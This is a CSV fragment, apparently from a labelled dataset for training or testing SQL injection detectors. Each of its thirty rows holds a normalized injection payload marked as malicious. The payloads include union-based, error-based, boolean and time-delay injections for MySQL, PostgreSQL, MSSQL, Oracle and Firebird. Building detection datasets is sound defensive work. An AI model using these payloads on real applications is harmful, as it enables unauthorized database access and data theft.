row_index,payload_norm,label,sqli_type_hint
5400,"1, ( select ( case when ( 5726 = 5275 ) then 1 else 1/ ( select 0 ) end ) )",1,
5401,"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""blkt"" like ""blkt",1,
5402,"-2605%' ) ) ) union all select 4738,4738#",1,
5403,"1%"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""%"" = """,1,
5404,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'gydh' = 'gydh",1,
5405,"1' union all select null,null,null,null,null,null,null--",1,
5406,5739-5738,1,
5407,"-7296%' ) ) ) union all select 9322,9322,9322,9322--",1,
5408,select ( case when ( 7033 = 1594 ) then 7033 else 7033* ( select 7033 from information_schema.character_sets ) end ) #,1,
5409,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""qzzg"" like ""qzzg",1,
5410,"1%"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
5411,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,
5412,"-4044%"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""%"" = """,1,
5413,"1"" ) ) as nejd where 2885 = 2885",1,
5414,-2745 ) ) as aywp where 9735 = 9735 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
5415,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 9847 = 9847",1,
5416,"-1844"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""abdw"" like ""abdw",1,
5417,"-8651"" ) where 8391 = 8391 union all select 8391,8391#",1,
5418,-4562' ) or 3038 = 3038,1,
5419,"1"" ) where 7840 = 7840 union all select null,null#",1,
5420,"-7382' ) ) or make_set ( 9425 = 4330,4330 ) and ( ( 'tvaz' like 'tvaz",1,
5421,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""yobb"" like ""yobb",1,
5422,"1' and elt ( 1210 = 1210,sleep ( 5 ) )",1,
5423,"-9037%"" union all select 6583#",1,
5424,"1"" where 7022 = 7022",1,
5425,"-4285' ) ) ) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1,
5426,1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) -- jduw,1,
5427,"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'fsvr' = 'fsvr",1,
5428,"1 and elt ( 1210 = 1210,sleep ( 5 ) )",1,
5429,select case when 2948 = 7279 then 1 else null end--,1,
